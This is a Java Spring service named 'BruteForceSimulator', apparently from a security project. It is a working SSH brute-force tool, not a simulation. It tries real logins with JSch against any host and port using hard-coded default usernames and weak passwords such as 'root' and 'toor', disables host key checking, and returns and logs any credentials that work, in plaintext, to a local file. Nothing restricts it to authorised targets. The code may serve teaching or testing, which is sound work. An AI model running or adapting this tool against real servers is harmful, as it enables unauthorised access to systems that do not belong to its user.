package com.cybersec.exploit;

import java.util.*;

import org.springframework.stereotype.Service;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

@Service
public class BruteForceSimulator {

     private final List<String> usernames = List.of("root", "admin", "user");
    private final List<String> passwords = List.of("1234", "password", "admin", "toor");

    public Map<String, String> bruteForce(String host, int port) {
        Map<String, String> result = new HashMap<>();
        result.put("target", host + ":" + port);
        result.put("status", "no valid credentials found");

        for (String user : usernames) {
            for (String pass : passwords) {
                if (attemptLogin(host, port, user, pass)) {
                    result.put("status", "success");
                    result.put("username", user);
                    result.put("password", pass);
                    return result;
                }
            }
        }

        return result;
    }

    private boolean attemptLogin(String host, int port, String username, String password) {
        JSch jsch = new JSch();
        Session session = null;
    
        try {
            session = jsch.getSession(username, host, port);
            session.setPassword(password);
    
            Properties config = new Properties();
            config.put("StrictHostKeyChecking", "no");
            session.setConfig(config);
    
            session.connect(1000);
            logAttempt(host, port, username, password, true); // SUCCESS
            session.disconnect();
            return true;
    
        } catch (JSchException e) {
            logAttempt(host, port, username, password, false); // FAILED
            return false;
        } finally {
            if (session != null && session.isConnected()) {
                session.disconnect();
            }
        }
    }
    

    private void logAttempt(String target, int port, String username, String password, boolean success) {
        String line = new Date() + " | Target: " + target + ":" + port +
                      " | User: " + username +
                      " | Pass: " + password +
                      " | Result: " + (success ? "SUCCESS" : "FAILED") + "\n";
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("bruteforce-log.txt"),
                line.getBytes(),
                java.nio.file.StandardOpenOption.CREATE,
                java.nio.file.StandardOpenOption.APPEND
            );
        } catch (Exception e) {
            System.out.println("Failed to write to bruteforce-log.txt: " + e.getMessage());
        }
    }
    
}
